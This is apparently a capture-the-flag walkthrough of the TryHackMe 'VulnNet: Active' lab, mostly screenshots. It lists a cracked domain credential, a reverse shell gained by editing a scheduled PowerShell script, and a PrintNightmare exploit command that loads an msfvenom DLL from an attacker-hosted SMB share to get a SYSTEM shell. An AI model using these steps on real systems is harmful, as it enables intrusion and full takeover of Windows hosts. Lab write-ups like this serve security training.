Link room: https://tryhackme.com/room/vulnnetactive
# ENUMERATING
## using nmap
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/43ddce29-ffdc-4daa-a71e-51536b79d33c)

## using redis-cli

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/28860da3-8235-44fc-9f02-ae27e283654b)

=> username: enterprise-security
## using crackmapexec
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/46e6cde6-986d-42e6-b0c6-4d4e172f024a)

Editing /etc/hosts

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/cfea7abb-7a2f-49f7-ac98-ce7099a6f352)

# EXPLOITING
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/950bccd3-ca4b-4f86-9191-816c3db4ba72)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/6fac0975-e090-4632-9dad-6cfda8b1476a)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/6a126008-34c2-44e5-9aba-fbb20d5b55ac)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/3c6923e7-57e0-4d25-ad86-6166be16e63e)

=> enterprise-security:sand_0873959498

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/8bfed8ab-e90d-40ee-8809-7eebc0647cc6)

=> directory: Enterprise-Share

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/4dc1a327-e625-42af-8c94-d37031ef964c)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/34561a08-2a5a-4b97-b747-e07bf48789b5)

I edit "PurgeIrrelevantData_1826.ps1" file.

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/45ddde64-e677-4d91-aad5-6ef61d25157d)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/cc7fd835-b710-490d-97b8-c115d338f718)

## upload file
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/81efe345-ec02-46de-8b89-931dfd9a4e50)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/2c679492-c5ad-43fb-b0d3-34d3be85a17c)

=> I get a reverse shell 

I find startup.bat file and download it.

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/5b9563af-c607-4427-b087-24319e4cdeb7)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/4c332cb7-60bd-4f24-9db2-8c9ce98fe89e)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/ae4b7b3e-a539-4ff2-ac20-43dfbc269f8e)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/667fd0de-d81c-4bdb-8bd1-df76b57694be)

## user.txt
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/49673de5-6285-4715-8321-77694e0c1ee8)

=> user.txt
# PRIVILEGE ESCALATION
## using msfvenom
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/ae85b8da-a3c6-41ff-a150-36ea1430c570)

=> creating shell.dll file
## CVE-2021-1675 / CVE-2021-34527 
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/01d12f29-3248-44be-88ad-42f6770ab3f9)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/22eefdd2-c7ca-4ce0-af3e-6a5a482906d4)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/90675be8-49b8-455d-b9d3-546b3e13b625)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/1bb94ac9-565e-4460-bf20-cd83d73d5f45)

## using mfconsole
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/ca001978-a18c-442a-9906-2bd225575ca7)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/118c2edc-fd4c-4a52-8c00-5c17771271af)

I use ```sudo smbserver.py share /home/kali/temp/ -smb2support``` command

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/d0355195-a83f-45af-ab2b-989530efc6be)

I use ```sudo python3 CVE-2021-1675.py VULNNET/enterprise-security:'sand_0873959498'@vulnnet.local '\\10.9.218.234\share\shell.dll'``` command

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/1872aa73-1e2d-4d70-af1b-55adfac8732d)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/e24e2939-1bee-439b-b64e-5ad1f02fece3)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/862500a4-87d8-4910-8d89-6548e1ef5152)

=> Haha.. Nice!!! I get system shell.

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/2c6886fa-03c7-485e-9926-889aebfbc165)

=> system.txt
## Done!!!
Thanks for reading. Bye!
